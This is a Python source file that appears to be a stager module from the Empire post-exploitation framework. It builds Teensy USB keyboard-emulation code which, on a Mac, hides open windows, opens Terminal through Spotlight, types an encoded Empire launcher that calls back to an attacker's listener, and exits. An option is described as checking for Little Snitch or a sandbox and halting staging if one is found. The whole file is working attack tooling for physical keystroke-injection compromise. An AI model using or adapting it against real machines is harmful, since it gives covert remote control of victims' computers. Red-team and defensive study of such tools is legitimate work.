from lib.common import helpers


class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'TeensyLauncher',

            'Author': ['Matt @matterpreter Hand'],

            'Description': ('Generates a Teensy script that runs a one-liner stage0 launcher for Empire.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'python'
            },
            'OutFile' : {
                'Description'   :   'File to output Teensy to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=safeChecks)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""

        else:
            launcher = launcher.replace('"', '\\"')

            teensyCode =  "void clearKeys (){\n"
            teensyCode += "    delay(200);\n"
            teensyCode += "    Keyboard.set_key1(0);\n"
            teensyCode += "    Keyboard.set_key2(0);\n"
            teensyCode += "    Keyboard.set_key3(0);\n"
            teensyCode += "    Keyboard.set_key4(0);\n"
            teensyCode += "    Keyboard.set_key5(0);\n"
            teensyCode += "    Keyboard.set_key6(0);\n"
            teensyCode += "    Keyboard.set_modifier(0);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "}\n\n"
            teensyCode += "void mac_minWindows(void) {\n"
            teensyCode += "    delay(200);\n"
            teensyCode += "    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI | MODIFIERKEY_ALT);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "    Keyboard.set_key1(KEY_H);\n"
            teensyCode += "    Keyboard.set_key2(KEY_M);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "    clearKeys();\n"
            teensyCode += "}\n\n"
            teensyCode += "void mac_openSpotlight(void) {\n"
            teensyCode += "    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\n"
            teensyCode += "    Keyboard.set_key1(KEY_SPACE);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "    clearKeys();\n"
            teensyCode += "}\n\n"
            teensyCode += "void mac_openTerminal(void) {\n"
            teensyCode += "    delay(200);\n"
            teensyCode += "    Keyboard.print(\"Terminal\");\n"
            teensyCode += "    delay(500);\n"
            teensyCode += "    Keyboard.set_key1(KEY_ENTER);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "    clearKeys();\n"
            teensyCode += "    Keyboard.set_modifier(MODIFIERKEY_GUI);\n"
            teensyCode += "    Keyboard.set_key1(KEY_N);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "    clearKeys();\n"
            teensyCode += "}\n\n"
            teensyCode += "void empire(void) {\n"
            teensyCode += "    delay(500);\n"
            teensyCode += "    mac_minWindows();\n"
            teensyCode += "    mac_minWindows();\n"
            teensyCode += "    delay(500);\n"
            teensyCode += "    mac_openSpotlight();\n"
            teensyCode += "    mac_openTerminal();\n"
            teensyCode += "    delay(2500);\n"
            teensyCode += "    Keyboard.print(\"" + launcher + "\");\n"
            teensyCode += "    Keyboard.set_key1(KEY_ENTER);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "    clearKeys();\n"
            teensyCode += "    delay(1000);\n"
            teensyCode += "    Keyboard.println(\"exit\");\n"
            teensyCode += "}\n\n"
            teensyCode += "void setup(void) {\n"
            teensyCode += "    empire();\n"
            teensyCode += "}\n\n"
            teensyCode += "void loop() {}"

            return teensyCode
